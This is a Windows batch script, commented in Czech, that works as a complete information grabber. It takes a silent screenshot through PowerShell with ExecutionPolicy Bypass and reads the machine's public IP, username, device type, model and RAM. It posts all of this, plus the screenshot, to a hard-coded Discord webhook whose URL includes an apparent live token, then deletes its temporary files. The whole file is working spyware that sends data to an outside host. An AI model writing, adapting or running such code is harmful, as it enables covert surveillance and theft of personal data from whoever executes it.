@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

:: 🌐 Webhook
set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"

:: 📸 Screenshot
set "ss=%TEMP%\screenshot_%RANDOM%.png"
powershell -ExecutionPolicy Bypass -Command ^
  "Add-Type -AssemblyName System.Windows.Forms; ^
   Add-Type -AssemblyName System.Drawing; ^
   $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
   $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; ^
   $graphics = [Drawing.Graphics]::FromImage($bmp); ^
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
   $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"

:: 🌍 IP + uživatel
for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
set "user=%USERNAME%"

:: 🕒 Datum a čas
for /f "tokens=1-4 delims=. " %%x in ("%date%") do (
    set "d1=%%x"
    set "d2=%%y"
    set "d3=%%z"
)
for /f "tokens=1-2 delims=: " %%x in ("%time%") do (
    set "t1=%%x"
    set "t2=%%y"
)
set "timestamp=!d1!.!d2!.!d3! !t1!:!t2!"

:: 💻 Typ zařízení
set "deviceType=Stolní PC"
for /f %%i in ('wmic path Win32_Battery get Name ^| findstr /i /v "Name"') do (
    set "deviceType=Notebook"
)

:: 🖥️ Model
set "deviceModel=Neznámý model"
for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
    if not defined deviceModel (
        set "deviceModel=%%i"
    )
)

:: 🧠 RAM
for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
set /a ram=%ramRaw:~0,-6%

:: 🧾 Zpráva
set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"

:: 💬 Odeslání textu
set "payload=%TEMP%\payload.json"
echo { > "!payload!"
echo   "content": "!msg!" >> "!payload!"
echo } >> "!payload!"
curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
del /f /q "!payload!"

:: 📤 Odeslání screenshotu
curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
del /f /q "%ss%"

:: ✅ Hotovo
exit
